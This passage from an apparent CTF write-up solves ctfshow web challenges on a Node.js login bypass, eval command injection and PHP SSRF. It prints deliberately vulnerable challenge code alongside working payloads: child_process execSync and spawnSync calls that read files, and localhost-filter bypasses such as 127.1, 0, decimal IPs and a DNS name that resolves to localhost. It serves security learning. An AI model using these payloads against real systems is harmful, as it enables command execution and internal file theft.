</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">regenerate</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;登录失败&#39;</span><span class="p">});</span>        
</span></span><span class="line"><span class="ln">22</span><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">loginUser</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">      <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;登录成功&#39;</span><span class="p">,</span><span class="nx">ret_flag</span><span class="o">:</span><span class="nx">flag</span><span class="p">});</span>              
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;账号或密码错误&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">  <span class="p">}</span>  
</span></span><span class="line"><span class="ln">30</span><span class="cl">  
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</span></span></code></pre></div><p>user.js</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nx">items</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="p">{</span><span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;CTFSHOW&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">]</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>审计一下代码看到已经给出了明文的账号密码</p>
<p>但是要注意这里</p>
<pre tabindex="0"><code>return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;
</code></pre><p>这里要去输入的账号不能为CTFSHOW，且输入的用户名转换为大写后与明文账号相同即可</p>
<p>那就很简单了，输入小写的ctfshow和密码123456即可得到flag</p>
<p><img alt="image-20241213215625920" loading="lazy" src="assets/image-20241213215625920.png"></p>
<h4 id="web335">web335<a hidden class="anchor" aria-hidden="true" href="#web335">#</a></h4>
<p><img alt="image-20241213215731651" loading="lazy" src="assets/image-20241213215731651.png"></p>
<p>查看源代码得到hint</p>
<p><img alt="image-20241213215755455" loading="lazy" src="assets/image-20241213215755455.png"></p>
<p>看到eval猜测是命令执行，js中的eval函数的利用与php中的有所不同</p>
<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。</p>
<p>payload:</p>
<pre tabindex="0"><code>/?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()
/?eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;).toString()

require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()

global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;,[&#39;.&#39;]).toString()
</code></pre><p>那为什么下面的方法会回显[object object]呢？</p>
<pre tabindex="0"><code>require(&#39;child_process&#39;).exec(&#39;calc&#39;); //这题不知道为什么exec用不了
</code></pre><blockquote>
<p>当你在 Web 界面通过某种命令注入手段调用 Node.js的 child_process 时，如果希望直接在页面上看到命令输出结果，execsync 会更直观。它会阻塞直到命令执行结束，并将结果返回给你的代码，你能直接以字符串形式处理和展示。而 exec则需要通过回调来拿结果，如果没写回调或没正确处理，就只会看到一个[object object]的返回。</p></blockquote>
<h4 id="web336">web336<a hidden class="anchor" aria-hidden="true" href="#web336">#</a></h4>
<p>这题跟上一题差不多，但是貌似把execSync办了</p>
<p>用其他方法即可</p>
<pre tabindex="0"><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()

global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;,[&#39;.&#39;]).toString()
</code></pre><h4 id="web337">web337<a hidden class="anchor" aria-hidden="true" href="#web337">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">function</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">return</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">/* GET home page. */</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;xxxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="o">===</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="o">!==</span><span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">flag</span><span class="p">)</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nx">b</span><span class="o">+</span><span class="nx">flag</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,{</span> <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;tql&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</span></span></code></pre></div><h3 id="ssrf">SSRF<a hidden class="anchor" aria-hidden="true" href="#ssrf">#</a></h3>
<h4 id="web351">web351<a hidden class="anchor" aria-hidden="true" href="#web351">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>没有过滤，直接读文件</p>
<p>Payload:</p>
<pre tabindex="0"><code>url=127.0.0.1/flag.php
url=localhost/flag.php
</code></pre><h4 id="web352">web352<a hidden class="anchor" aria-hidden="true" href="#web352">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|127.0.0/&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题限制了只能使用http和https协议</p>
<p>同时也添加了过滤</p>
<pre tabindex="0"><code>if(!preg_match(&#39;/localhost|127.0.0/&#39;))
</code></pre><p>缺省法</p>
<p>payload：</p>
<pre tabindex="0"><code>url=http://127.1/flag.php

url=http://0/flag.php
//windows中解析为0.0.0.0
//linux解析为127.0.0.1
</code></pre><p>or</p>
<p>使用十进制绕过</p>
<p>payload：</p>
<pre tabindex="0"><code>url=http://2130706433/flag.php
</code></pre><h4 id="web353">web353<a hidden class="anchor" aria-hidden="true" href="#web353">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|127\.0\.|\。/i&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>过滤</p>
<pre tabindex="0"><code>!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url)
</code></pre><p>这题依旧可以用上题方法解决</p>
<p>其他payload：</p>
<pre tabindex="0"><code>// 127.0.0.1 ~ 127.255.255.254 都表示 localhost

url=http://127.255.255.254/flag.php
</code></pre><p>127开头都会被解析为localhost</p>
<h4 id="web354">web354<a hidden class="anchor" aria-hidden="true" href="#web354">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|1|0|。/i&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题的1和0都被过滤了，我们可以用dns重定向的方法来绕过</p>
<p>网络上存在一个域名sudo.cc会重定向到127.0.0.1</p>
<p>payload:</p>
<pre tabindex="0"><code>url=http://sudo.cc/flag.php
</code></pre><p>其他方法</p>
<p>可以用自己的域名进行dns重定向</p>
<p>或者通过 <a href="http://ceye.io/">http://ceye.io/</a></p>
<h4 id="web355">web355<a hidden class="anchor" aria-hidden="true" href="#web355">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$host</span><span class="o">=</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">5</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题对host的长度进行了限制，但是由于没有进行过滤我们可以用0来代替127.0.0.1</p>
<p>payload：</p>
<pre tabindex="0"><code>url=http://0/flag.php
</code></pre><p>or</p>
<pre tabindex="0"><code>url=http://127.1/flag.php
</code></pre><h4 id="web356">web356<a hidden class="anchor" aria-hidden="true" href="#web356">#</a></h4>
